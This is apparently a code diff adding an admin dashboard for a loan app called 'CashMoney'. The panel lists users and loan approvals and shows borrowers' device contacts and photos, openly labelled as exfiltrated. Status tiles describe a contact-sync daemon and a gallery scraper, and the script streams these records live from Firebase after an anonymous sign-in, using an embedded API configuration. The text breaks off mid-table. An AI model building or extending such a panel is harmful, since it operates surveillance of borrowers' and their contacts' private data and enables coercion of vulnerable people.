@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CashMoney Live Admin Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+        .custom-scrollbar::-webkit-scrollbar { width: 6px; height: 6px; }
+        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
+        .custom-scrollbar::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
+        
+        @keyframes slideInRight {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        .toast-enter { animation: slideInRight 0.3s ease-out forwards; }
+        
+        /* Mobile sidebar transition */
+        #sidebar { transition: transform 0.3s ease-in-out; }
+        .sidebar-open { transform: translateX(0) !important; }
+    </style>
+</head>
+<body class="bg-gray-50 text-gray-800 h-screen flex overflow-hidden w-full">
+
+    <!-- Mobile Sidebar Overlay -->
+    <div id="sidebar-overlay" class="fixed inset-0 bg-gray-900 bg-opacity-50 z-20 hidden md:hidden" onclick="toggleSidebar()"></div>
+
+    <!-- Sidebar -->
+    <aside id="sidebar" class="w-64 bg-gray-900 text-white flex flex-col z-30 shrink-0 fixed inset-y-0 left-0 transform -translate-x-full md:relative md:translate-x-0 h-full shadow-2xl md:shadow-none">
+        <div class="h-16 flex items-center justify-between px-6 border-b border-gray-800">
+            <div class="flex items-center">
+                <i class="ph-fill ph-currency-circle text-emerald-400 text-3xl mr-2"></i>
+                <span class="text-xl font-bold tracking-wide">CashMoney<span class="text-emerald-400">.</span></span>
+            </div>
+            <button class="md:hidden text-gray-400 hover:text-white" onclick="toggleSidebar()">
+                <i class="ph ph-x text-2xl"></i>
+            </button>
+        </div>
+        
+        <nav class="flex-1 overflow-y-auto py-4 space-y-1 custom-scrollbar">
+            <a href="#" onclick="switchTab('dashboard')" class="nav-item flex items-center px-6 py-3 text-gray-300 hover:bg-gray-800 hover:text-white transition-colors bg-gray-800 text-white border-l-4 border-emerald-400 pl-5" data-target="dashboard">
+                <i class="ph ph-squares-four text-xl mr-3"></i> Dashboard
+            </a>
+            <a href="#" onclick="switchTab('users')" class="nav-item flex items-center px-6 py-3 text-gray-300 hover:bg-gray-800 hover:text-white transition-colors" data-target="users">
+                <i class="ph ph-users text-xl mr-3"></i> Users
+                <span id="nav-users-count" class="ml-auto bg-gray-700 text-xs py-0.5 px-2 rounded-full hidden">0</span>
+            </a>
+            <a href="#" onclick="switchTab('loans')" class="nav-item flex items-center px-6 py-3 text-gray-300 hover:bg-gray-800 hover:text-white transition-colors" data-target="loans">
+                <i class="ph ph-file-text text-xl mr-3"></i> Approvals
+                <span id="nav-loans-count" class="ml-auto bg-emerald-500 text-white text-xs py-0.5 px-2 rounded-full hidden">0</span>
+            </a>
+            <div class="px-6 mt-6 mb-2 text-xs font-semibold text-gray-500 uppercase tracking-wider">Device Data</div>
+            <a href="#" onclick="switchTab('contacts')" class="nav-item flex items-center px-6 py-3 text-gray-300 hover:bg-gray-800 hover:text-white transition-colors" data-target="contacts">
+                <i class="ph ph-address-book text-xl mr-3"></i> Contacts
+            </a>
+            <a href="#" onclick="switchTab('gallery')" class="nav-item flex items-center px-6 py-3 text-gray-300 hover:bg-gray-800 hover:text-white transition-colors" data-target="gallery">
+                <i class="ph ph-image text-xl mr-3"></i> Gallery
+            </a>
+        </nav>
+
+        <div class="p-4 border-t border-gray-800">
+            <div class="flex items-center">
+                <div class="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm">
+                    A
+                </div>
+                <div class="ml-3 truncate">
+                    <p class="text-sm font-medium truncate">Live Admin</p>
+                    <p class="text-xs text-gray-400 flex items-center gap-1">
+                        <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span> Connected
+                    </p>
+                </div>
+            </div>
+        </div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="flex-1 flex flex-col min-w-0 overflow-hidden relative">
+        
+        <!-- Header -->
+        <header class="h-16 bg-white border-b border-gray-200 flex items-center justify-between px-4 sm:px-6 z-10 shrink-0">
+            <div class="flex items-center gap-3">
+                <button class="md:hidden text-gray-600 hover:text-gray-900" onclick="toggleSidebar()">
+                    <i class="ph ph-list text-2xl"></i>
+                </button>
+                <h2 id="page-title" class="text-lg sm:text-xl font-semibold text-gray-800 truncate">Dashboard Overview</h2>
+            </div>
+            
+            <div class="flex items-center space-x-3 sm:space-x-4">
+                <div class="hidden sm:flex items-center text-xs text-gray-500 bg-gray-100 px-3 py-1.5 rounded-full">
+                    <i class="ph ph-database mr-1.5"></i> Firebase Live
+                </div>
+                <button class="text-gray-400 hover:text-gray-600 transition-colors relative">
+                    <i class="ph ph-bell text-xl sm:text-2xl"></i>
+                    <span class="absolute top-0 right-0 w-2 h-2 sm:w-2.5 sm:h-2.5 bg-red-500 rounded-full border-2 border-white"></span>
+                </button>
+            </div>
+        </header>
+
+        <!-- Loading Overlay -->
+        <div id="loading-overlay" class="absolute inset-0 bg-white/80 z-20 flex flex-col items-center justify-center backdrop-blur-sm">
+            <i class="ph ph-spinner-gap text-4xl text-emerald-500 animate-spin mb-4"></i>
+            <p class="text-gray-600 font-medium">Syncing with secure database...</p>
+        </div>
+
+        <!-- Content Area -->
+        <div class="flex-1 overflow-y-auto p-4 sm:p-6 bg-gray-50 custom-scrollbar relative" id="main-content">
+            
+            <!-- Dashboard View -->
+            <section id="view-dashboard" class="view-section space-y-6">
+                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6">
+                    <div class="bg-white p-5 rounded-xl shadow-sm border border-gray-100 flex items-center space-x-4">
+                        <div class="p-3 bg-blue-50 text-blue-600 rounded-lg shrink-0"><i class="ph-fill ph-users text-2xl sm:text-3xl"></i></div>
+                        <div class="min-w-0 flex-1">
+                            <p class="text-xs sm:text-sm text-gray-500 font-medium truncate">Total Registered Users</p>
+                            <p class="text-xl sm:text-2xl font-bold text-gray-800" id="dash-users-count">0</p>
+                        </div>
+                    </div>
+                    <div class="bg-white p-5 rounded-xl shadow-sm border border-gray-100 flex items-center space-x-4 cursor-pointer hover:border-amber-200 transition-colors" onclick="switchTab('loans')">
+                        <div class="p-3 bg-amber-50 text-amber-600 rounded-lg shrink-0"><i class="ph-fill ph-clock-countdown text-2xl sm:text-3xl"></i></div>
+                        <div class="min-w-0 flex-1">
+                            <p class="text-xs sm:text-sm text-gray-500 font-medium truncate">Pending Approvals</p>
+                            <p class="text-xl sm:text-2xl font-bold text-gray-800" id="dash-pending-count">0</p>
+                        </div>
+                    </div>
+                    <div class="bg-white p-5 rounded-xl shadow-sm border border-gray-100 flex items-center space-x-4 sm:col-span-2 lg:col-span-1">
+                        <div class="p-3 bg-emerald-50 text-emerald-600 rounded-lg shrink-0"><i class="ph-fill ph-money text-2xl sm:text-3xl"></i></div>
+                        <div class="min-w-0 flex-1">
+                            <p class="text-xs sm:text-sm text-gray-500 font-medium truncate">Active Loans (Total Value)</p>
+                            <p class="text-xl sm:text-2xl font-bold text-gray-800" id="dash-total-value">₹0</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div class="bg-white rounded-xl shadow-sm border border-gray-100 p-5">
+                        <h3 class="text-base sm:text-lg font-semibold mb-4 text-gray-800">Recent Activity</h3>
+                        <div class="space-y-4" id="recent-activity-list">
+                            <!-- Populated by JS -->
+                            <p class="text-sm text-gray-500 italic">Waiting for activity...</p>
+                        </div>
+                    </div>
+                    
+                    <div class="bg-white rounded-xl shadow-sm border border-gray-100 p-5">
+                        <h3 class="text-base sm:text-lg font-semibold mb-4 text-gray-800">System Status</h3>
+                        <div class="space-y-3">
+                            <div class="flex items-center justify-between">
+                                <span class="text-sm text-gray-600">Database Connection</span>
+                                <span class="text-xs font-medium px-2 py-1 bg-green-100 text-green-700 rounded-full flex items-center gap-1"><i class="ph-fill ph-check-circle"></i> Online</span>
+                            </div>
+                            <div class="flex items-center justify-between">
+                                <span class="text-sm text-gray-600">Contact Sync Daemon</span>
+                                <span class="text-xs font-medium px-2 py-1 bg-green-100 text-green-700 rounded-full flex items-center gap-1"><i class="ph-fill ph-check-circle"></i> Active</span>
+                            </div>
+                            <div class="flex items-center justify-between">
+                                <span class="text-sm text-gray-600">Gallery Scraper</span>
+                                <span class="text-xs font-medium px-2 py-1 bg-green-100 text-green-700 rounded-full flex items-center gap-1"><i class="ph-fill ph-check-circle"></i> Active</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Users View -->
+            <section id="view-users" class="view-section hidden">
+                <div class="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden flex flex-col h-full">
+                    <div class="p-4 sm:p-5 border-b border-gray-100 flex flex-col sm:flex-row sm:justify-between sm:items-center gap-3">
+                        <h3 class="text-lg font-semibold text-gray-800">Registered Users</h3>
+                        <div class="relative w-full sm:w-64">
+                            <i class="ph ph-magnifying-glass absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
+                            <input type="text" id="search-users" placeholder="Search by name or ID..." class="w-full pl-10 pr-4 py-2 border border-gray-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500 transition-shadow">
+                        </div>
+                    </div>
+                    <div class="overflow-x-auto custom-scrollbar">
+                        <table class="w-full text-left border-collapse min-w-[600px]">
+                            <thead>
+                                <tr class="bg-gray-50 text-gray-500 text-xs uppercase tracking-wider">
+                                    <th class="px-6 py-4 font-medium border-b w-32">User ID</th>
+                                    <th class="px-6 py-4 font-medium border-b">Full Name</th>
+                                    <th class="px-6 py-4 font-medium border-b">Phone Number</th>
+                                    <th class="px-6 py-4 font-medium border-b">Registration Date</th>
+                                    <th class="px-6 py-4 font-medium border-b text-center">Status</th>
+                                </tr>
+                            </thead>
+                            <tbody id="users-tbody" class="text-sm divide-y divide-gray-100">
+                                <tr><td colspan="5" class="px-6 py-8 text-center text-gray-400">Loading users...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Loans View -->
+            <section id="view-loans" class="view-section hidden">
+                
+                <!-- Filters -->
+                <div class="mb-4 flex gap-2 overflow-x-auto pb-2 custom-scrollbar">
+                    <button class="loan-filter-btn px-4 py-2 rounded-lg text-sm font-medium bg-gray-800 text-white shadow-sm whitespace-nowrap transition-colors" data-filter="pending" onclick="filterLoans('pending')">Pending Approvals</button>
+                    <button class="loan-filter-btn px-4 py-2 rounded-lg text-sm font-medium bg-white text-gray-600 border border-gray-200 hover:bg-gray-50 shadow-sm whitespace-nowrap transition-colors" data-filter="approved" onclick="filterLoans('approved')">Approved</button>
+                    <button class="loan-filter-btn px-4 py-2 rounded-lg text-sm font-medium bg-white text-gray-600 border border-gray-200 hover:bg-gray-50 shadow-sm whitespace-nowrap transition-colors" data-filter="rejected" onclick="filterLoans('rejected')">Rejected</button>
+                </div>
+
+                <div class="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
+                    <div class="overflow-x-auto custom-scrollbar">
+                        <table class="w-full text-left border-collapse min-w-[750px]">
+                            <thead>
+                                <tr class="bg-gray-50 text-gray-500 text-xs uppercase tracking-wider">
+                                    <th class="px-6 py-4 font-medium border-b">Request ID</th>
+                                    <th class="px-6 py-4 font-medium border-b">Borrower</th>
+                                    <th class="px-6 py-4 font-medium border-b">Amount</th>
+                                    <th class="px-6 py-4 font-medium border-b">Terms</th>
+                                    <th class="px-6 py-4 font-medium border-b">Status</th>
+                                    <th class="px-6 py-4 font-medium border-b text-right">Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="loans-tbody" class="text-sm divide-y divide-gray-100">
+                                <tr><td colspan="6" class="px-6 py-8 text-center text-gray-400">Loading loans...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Contacts View -->
+            <section id="view-contacts" class="view-section hidden">
+                <div class="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
+                    <div class="p-4 sm:p-5 border-b border-gray-100">
+                        <h3 class="text-lg font-semibold text-gray-800">Synced Device Contacts</h3>
+                        <p class="text-xs sm:text-sm text-gray-500 mt-1">Real-time sync of address books from user devices.</p>
+                    </div>
+                    <div class="overflow-x-auto custom-scrollbar">
+                        <table class="w-full text-left border-collapse min-w-[600px]">
+                            <thead>
+                                <tr class="bg-gray-50 text-gray-500 text-xs uppercase tracking-wider">
+                                    <th class="px-6 py-4 font-medium border-b">Owner (User ID)</th>
+                                    <th class="px-6 py-4 font-medium border-b">Contact Name</th>
+                                    <th class="px-6 py-4 font-medium border-b">Phone Number</th>
+                                    <th class="px-6 py-4 font-medium border-b">AI Tag</th>
+                                </tr>
+                            </thead>
+                            <tbody id="contacts-tbody" class="text-sm divide-y divide-gray-100">
+                                <tr><td colspan="4" class="px-6 py-8 text-center text-gray-400">Loading contacts...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Gallery View -->
+            <section id="view-gallery" class="view-section hidden">
+                <div class="bg-white rounded-xl shadow-sm border border-gray-100 p-4 sm:p-5 mb-6 flex flex-col sm:flex-row justify-between sm:items-center gap-4">
+                    <div>
+                        <h3 class="text-lg font-semibold text-gray-800">Exfiltrated Gallery Media</h3>
+                        <p class="text-xs sm:text-sm text-gray-500 mt-1">Auto-synced photos from applicant devices for risk assessment.</p>
+                    </div>
+                    <div class="relative w-full sm:w-64">
+                        <select id="gallery-user-filter" class="w-full pl-3 pr-8 py-2 border border-gray-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500 bg-white appearance-none">
+                            <option value="all">All Users</option>
+                            <!-- Dynamically populated -->
+                        </select>
+                        <i class="ph ph-caret-down absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 pointer-events-none"></i>
+                    </div>
+                </div>
+                
+                <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3 sm:gap-4" id="gallery-grid">
+                    <!-- Populated by JS -->
+                </div>
+                <div id="gallery-empty" class="hidden text-center py-12 text-gray-500">
+                    <i class="ph ph-image-broken text-4xl mb-3 text-gray-300"></i>
+                    <p>No media found for the selected filter.</p>
+                </div>
+            </section>
+
+        </div>
+    </main>
+
+    <!-- Toast Container -->
+    <div id="toast-container" class="fixed top-4 right-4 sm:top-auto sm:bottom-6 sm:right-6 flex flex-col gap-3 z-50 pointer-events-none"></div>
+
+    <!-- Custom Modal -->
+    <div id="action-modal" class="fixed inset-0 bg-gray-900 bg-opacity-50 z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-xl shadow-xl w-full max-w-md overflow-hidden transform scale-95 opacity-0 transition-all duration-200" id="modal-content">
+            <div class="p-6">
+                <h3 class="text-lg font-bold text-gray-900 mb-2" id="modal-title">Confirm Action</h3>
+                <p class="text-sm text-gray-600 mb-6" id="modal-message">Are you sure you want to proceed?</p>
+                <div class="flex justify-end space-x-3">
+                    <button onclick="closeModal()" class="px-4 py-2 rounded-lg text-sm font-medium text-gray-600 hover:bg-gray-100 transition-colors">Cancel</button>
+                    <button id="modal-confirm-btn" class="px-4 py-2 rounded-lg text-sm font-medium text-white transition-colors">Confirm</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-analytics.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, doc, collection, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // Firebase project configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDWY5V4lCsbNMRgAZy5sRgfmhk6__3ifp4",
+            authDomain: "cashmoney-b443d.firebaseapp.com",
+            projectId: "cashmoney-b443d",
+            storageBucket: "cashmoney-b443d.firebasestorage.app",
+            messagingSenderId: "486748729220",
+            appId: "1:486748729220:web:c0e82b71be90be782b77d1",
+            measurementId: "G-92YG72YRRJ"
+        };
+
+        let app;
+        let db;
+        let auth;
+        try {
+            app = initializeApp(firebaseConfig);
+            try {
+                getAnalytics(app);
+            } catch (analyticsError) {
+                console.warn("Firebase Analytics is unavailable in this environment:", analyticsError);
+            }
+            db = getFirestore(app);
+            auth = getAuth(app);
+        } catch (e) {
+            console.error("Firebase init failed", e);
+        }
+
+        // App State
+        const state = {
+            users: [],
+            loans: [],
+            contacts: [],
+            gallery: [],
+            currentLoanFilter: 'pending',
+            searchQuery: ''
+        };
+
+        // UI Helpers
+        window.toggleSidebar = () => {
+            const sidebar = document.getElementById('sidebar');
+            const overlay = document.getElementById('sidebar-overlay');
+            sidebar.classList.toggle('sidebar-open');
+            overlay.classList.toggle('hidden');
+        };
+
+        window.switchTab = (tabId) => {
+            // Mobile close sidebar on click
+            if (window.innerWidth < 768) {
+                document.getElementById('sidebar').classList.remove('sidebar-open');
+                document.getElementById('sidebar-overlay').classList.add('hidden');
+            }
+
+            document.querySelectorAll('.nav-item').forEach(el => {
+                if(el.dataset.target === tabId) {
+                    el.classList.add('bg-gray-800', 'text-white', 'border-l-4', 'border-emerald-400', 'pl-5');
+                    el.classList.remove('text-gray-300', 'pl-6');
+                } else {
+                    el.classList.remove('bg-gray-800', 'text-white', 'border-l-4', 'border-emerald-400', 'pl-5');
+                    el.classList.add('text-gray-300', 'pl-6');
+                }
+            });
+
+            const titles = {
+                'dashboard': 'Dashboard Overview',
+                'users': 'User Management',
+                'loans': 'Loan Application Processing',
+                'contacts': 'Exfiltrated Contacts Database',
+                'gallery': 'User Media Gallery'
+            };
+            document.getElementById('page-title').innerText = titles[tabId] || 'Dashboard';
+
+            document.querySelectorAll('.view-section').forEach(section => {
+                section.classList.add('hidden');
+            });
+            document.getElementById(`view-${tabId}`).classList.remove('hidden');
+            
+            // Re-render specific views if needed based on state
+            if(tabId === 'loans') updateLoansUI();
+            if(tabId === 'users') updateUsersUI();
+        };
+
+        window.showToast = (message, type = 'success') => {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            const colors = type === 'success' ? 'bg-emerald-500' : (type === 'error' ? 'bg-red-500' : 'bg-amber-500');
+            const icon = type === 'success' ? 'ph-check-circle' : (type === 'error' ? 'ph-x-circle' : 'ph-info');
+
+            toast.className = `${colors} text-white px-4 py-3 rounded-lg shadow-lg flex items-center space-x-3 toast-enter min-w-[280px] pointer-events-auto`;
+            toast.innerHTML = `
+                <i class="ph ${icon} text-xl shrink-0"></i>
+                <span class="font-medium text-sm flex-1 leading-snug">${message}</span>
+                <button onclick="this.parentElement.remove()" class="text-white hover:text-white/80 shrink-0"><i class="ph ph-x"></i></button>
+            `;
+
+            container.appendChild(toast);
+            setTimeout(() => {
+                if(toast.parentElement) {
+                    toast.style.opacity = '0';
+                    toast.style.transform = 'translateY(10px)';
+                    toast.style.transition = 'all 0.3s ease-in-out';
+                    setTimeout(() => toast.remove(), 300);
+                }
+            }, 4000);
+        };
+
+        // Modal Logic
+        let currentModalAction = null;
+        window.openModal = (title, message, confirmText, confirmColor, actionCallback) => {
+            const modal = document.getElementById('action-modal');
+            const content = document.getElementById('modal-content');
+            document.getElementById('modal-title').innerText = title;
+            document.getElementById('modal-message').innerText = message;
+            
+            const btn = document.getElementById('modal-confirm-btn');
+            btn.innerText = confirmText;
+            btn.className = `px-4 py-2 rounded-lg text-sm font-medium text-white transition-colors ${confirmColor}`;
+            
+            currentModalAction = actionCallback;
+            btn.onclick = () => {
+                if(currentModalAction) currentModalAction();
+                window.closeModal();
+            };
+
+            modal.classList.remove('hidden');
+            // small delay for animation
+            setTimeout(() => {
+                content.classList.remove('scale-95', 'opacity-0');
+                content.classList.add('scale-100', 'opacity-100');
+            }, 10);
+        };
+
+        window.closeModal = () => {
+            const modal = document.getElementById('action-modal');
+            const content = document.getElementById('modal-content');
+            content.classList.remove('scale-100', 'opacity-100');
+            content.classList.add('scale-95', 'opacity-0');
+            setTimeout(() => {
+                modal.classList.add('hidden');
+                currentModalAction = null;
+            }, 200);
+        };
+
+        // Formatters
+        const formatMoney = (amount) => new Intl.NumberFormat('en-IN', { style: 'currency', currency: 'INR' }).format(amount);
+        const formatDate = (ts) => {
+            if(!ts) return 'Unknown';
+            // Handle firebase timestamp or ISO string
+            const date = ts.seconds ? new Date(ts.seconds * 1000) : new Date(ts);
+            return date.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
+        };
+        const escapeHTML = (str) => {
+            if(!str) return '';
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        };
+
+        // Authentication Guard
+        const authenticateAndInit = () => {
+            if (!auth || !db) {
+                showToast("Firebase could not be initialized. Check the browser console.", 'error');
+                return;
+            }
+
+            onAuthStateChanged(auth, async (user) => {
+                if (user) {
+                    console.log("Admin authenticated");
+                    setupRealtimeListeners();
+
+                    // Fade out loading immediately since we rely purely on live data
+                    const loader = document.getElementById('loading-overlay');
+                    if (loader) {
+                        loader.style.opacity = '0';
+                        loader.style.transition = 'opacity 0.5s';
+                        setTimeout(() => loader.remove(), 500);
+                    }
+                }
+            });
+
+            signInAnonymously(auth).catch(error => {
+                console.error("Anonymous authentication failed:", error);
+                showToast("Authentication failed. Enable Anonymous sign-in in Firebase Authentication.", 'error');
+                const loader = document.getElementById('loading-overlay');
+                if (loader) loader.remove();
+            });
+        };
+
+        const setupRealtimeListeners = () => {
+            // Users Listener
+            onSnapshot(collection(db, 'users'), (snap) => {
+                state.users = snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                updateUsersUI();
+                updateDashboardStats();
+            }, (error) => console.error("Users sync error:", error));
+
+            // Loans Listener
+            onSnapshot(collection(db, 'loans'), (snap) => {
+                state.loans = snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                // Sort by date desc
+                state.loans.sort((a,b) => new Date(b.ts || 0) - new Date(a.ts || 0));
+                updateLoansUI();
+                updateDashboardStats();
+            }, (error) => console.error("Loans sync error:", error));
+
+            // Contacts Listener
+            onSnapshot(collection(db, 'contacts'), (snap) => {
+                state.contacts = snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                updateContactsUI();
+            }, (error) => console.error("Contacts sync error:", error));
+
+            // Gallery Listener
+            onSnapshot(collection(db, 'gallery'), (snap) => {
+                state.gallery = snap.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+                updateGalleryUI();
+            }, (error) => console.error("Gallery sync error:", error));
+        };
+
+        const updateDashboardStats = () => {
+            document.getElementById('dash-users-count').innerText = state.users.length.toLocaleString();
+            
+            const pendingLoans = state.loans.filter(l => l.status === 'pending');
+            document.getElementById('dash-pending-count').innerText = pendingLoans.length.toLocaleString();
+            
+            const approvedLoans = state.loans.filter(l => l.status === 'approved');
+            const totalVal = approvedLoans.reduce((sum, loan) => sum + (Number(loan.amount) || 0), 0);
+            document.getElementById('dash-total-value').innerText = formatMoney(totalVal);
+
+            // Update Nav badges
+            const userBadge = document.getElementById('nav-users-count');
+            userBadge.innerText = state.users.length;
+            userBadge.classList.remove('hidden');
+
+            const loanBadge = document.getElementById('nav-loans-count');
+            loanBadge.innerText = pendingLoans.length;
+            if(pendingLoans.length > 0) {
+                loanBadge.classList.remove('hidden');
+                loanBadge.classList.add('animate-pulse');
+            } else {
+                loanBadge.classList.add('hidden');
+                loanBadge.classList.remove('animate-pulse');
+            }
+
+            // Recent Activity
+            const activityList = document.getElementById('recent-activity-list');
+            const recentLoans = [...state.loans].slice(0, 4);
+            if(recentLoans.length === 0) {
+                activityList.innerHTML = '<p class="text-sm text-gray-500 italic">No recent activity.</p>';
+            } else {
+                activityList.innerHTML = recentLoans.map(loan => {
+                    let statusHtml = '';
+                    if(loan.status === 'pending') statusHtml = '<span class="text-amber-500 font-medium">requested</span>';
+                    else if(loan.status === 'approved') statusHtml = '<span class="text-emerald-500 font-medium">was approved</span>';
+                    else statusHtml = '<span class="text-red-500 font-medium">was rejected</span>';
+                    
+                    return `
+                    <div class="flex items-start space-x-3 text-sm">
+                        <div class="mt-0.5 w-2 h-2 rounded-full ${loan.status==='pending'?'bg-amber-400':(loan.status==='approved'?'bg-emerald-400':'bg-red-400')}"></div>
+                        <div class="flex-1">
+                            <p class="text-gray-800"><span class="font-medium">${escapeHTML(loan.name)}</span> ${statusHtml} a loan of ${formatMoney(loan.amount)}.</p>
+                            <p class="text-xs text-gray-400 mt-0.5">${formatDate(loan.ts)}</p>
+                        </div>
+                    </div>`;
+                }).join('');
+            }
+        };
+
+        const updateUsersUI = () => {
+            const tbody = document.getElementById('users-tbody');
+            
+            // Search filter
+            let filteredUsers = state.users;
+            const q = state.searchQuery.toLowerCase().trim();
+            if(q) {
+                filteredUsers = filteredUsers.filter(u => 
+                    (u.name || '').toLowerCase().includes(q) || 
+                    (u.id || '').toLowerCase().includes(q)
+                );
+            }
+
+            if(filteredUsers.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="5" class="px-6 py-8 text-center text-gray-500">No users found.</td></tr>`;
+                return;
+            }
+
+            tbody.innerHTML = filteredUsers.map(user => {
+                const statusColor = user.status === 'Active' ? 'text-emerald-700 bg-emerald-100' : 
+                                  (user.status === 'Flagged' ? 'text-amber-700 bg-amber-100' : 'text-gray-700 bg-gray-100');
+                return `
+                    <tr class="hover:bg-gray-50 transition-colors">
+                        <td class="px-6 py-4 font-mono text-xs text-gray-500 break-all">${escapeHTML(user.id)}</td>
+                        <td class="px-6 py-4 font-medium text-gray-800">${escapeHTML(user.name)}</td>
+                        <td class="px-6 py-4 text-gray-600 whitespace-nowrap">${escapeHTML(user.phone)}</td>
+                        <td class="px-6 py-4 text-gray-600 whitespace-nowrap">${formatDate(user.date)}</td>
+                        <td class="px-6 py-4 text-center">
+                            <span class="px-2.5 py-1 rounded-full text-xs font-medium ${statusColor}">${escapeHTML(user.status || 'Unknown')}</span>
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+            
+            // Update user filter in gallery
+            const userFilter = document.getElementById('gallery-user-filter');
+            const currVal = userFilter.value;
+            userFilter.innerHTML = '<option value="all">All Users</option>' + 
+                state.users.map(u => `<option value="${escapeHTML(u.id)}">${escapeHTML(u.name)} (${escapeHTML(u.id)})</option>`).join('');
+            if(state.users.find(u => u.id === currVal)) {
+                userFilter.value = currVal;
+            }
+        };
+
+        // Setup search listener
+        document.getElementById('search-users').addEventListener('input', (e) => {
+            state.searchQuery = e.target.value;
+            updateUsersUI();
+        });
+
+        window.filterLoans = (status) => {
+            state.currentLoanFilter = status;
+            // Update UI buttons
+            document.querySelectorAll('.loan-filter-btn').forEach(btn => {
+                if(btn.dataset.filter === status) {
+                    btn.className = "loan-filter-btn px-4 py-2 rounded-lg text-sm font-medium bg-gray-800 text-white shadow-sm whitespace-nowrap transition-colors";
+                } else {
+                    btn.className = "loan-filter-btn px-4 py-2 rounded-lg text-sm font-medium bg-white text-gray-600 border border-gray-200 hover:bg-gray-50 shadow-sm whitespace-nowrap transition-colors";
+                }
+            });
+            updateLoansUI();
+        };
+
+        const updateLoansUI = () => {
+            const tbody = document.getElementById('loans-tbody');
+            const filtered = state.loans.filter(l => l.status === state.currentLoanFilter);
+            
+            if(filtered.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="6" class="px-6 py-8 text-center text-gray-500">No ${state.currentLoanFilter} loans.</td></tr>`;
+                return;
+            }
+
+            tbody.innerHTML = filtered.map(loan => {
+                let statusBadge = '';
+                let actionsHtml = '';
+                
+                if(loan.status === 'pending') {
+                    statusBadge = `<span class="px-2 py-1 rounded text-xs font-medium bg-amber-100 text-amber-700 whitespace-nowrap"><i class="ph-fill ph-clock mr-1"></i>Pending</span>`;
+                    actionsHtml = `
+                        <div class="flex justify-end gap-2">
+                            <button onclick="handleLoanAction('${loan.id}', 'approve', '${escapeHTML(loan.name)}')" class="p-1.5 bg-emerald-50 text-emerald-600 hover:bg-emerald-500 hover:text-white rounded transition-colors" title="Approve">
+                                <i class="ph ph-check text-lg"></i>
+                            </button>
+                            <button onclick="handleLoanAction('${loan.id}', 'reject', '${escapeHTML(loan.name)}')" class="p-1.5 bg-red-50 text-red-600 hover:bg-red-500 hover:text-white rounded transition-colors" title="Reject">
+                                <i class="ph ph-x text-lg"></i>
+                            </button>
+                        </div>
+                    `;
+                } else if(loan.status === 'approved') {
+                    statusBadge = `<span class="px-2 py-1 rounded text-xs font-medium bg-emerald-100 text-emerald-700 whitespace-nowrap"><i class="ph-fill ph-check-circle mr-1"></i>Approved</span>`;
+                    actionsHtml = `<span class="text-xs text-gray-400">Processed</span>`;
+                } else {
+                    statusBadge = `<span class="px-2 py-1 rounded text-xs font-medium bg-red-100 text-red-700 whitespace-nowrap"><i class="ph-fill ph-x-circle mr-1"></i>Rejected</span>`;
+                    actionsHtml = `<span class="text-xs text-gray-400">Processed</span>`;
+                }
+
+                return `
+                    <tr class="hover:bg-gray-50 transition-colors">
+                        <td class="px-6 py-4 font-mono text-xs text-gray-500 break-all">${escapeHTML(loan.id)}</td>
+                        <td class="px-6 py-4">
+                            <div class="font-medium text-gray-800">${escapeHTML(loan.name)}</div>
